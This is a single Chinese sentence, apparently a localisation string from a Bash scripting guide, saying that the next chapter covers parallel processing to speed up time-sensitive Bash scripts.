  zh: 在下一章中，我们将探讨并行处理以加快对时间敏感的 Bash 脚本的执行速度。
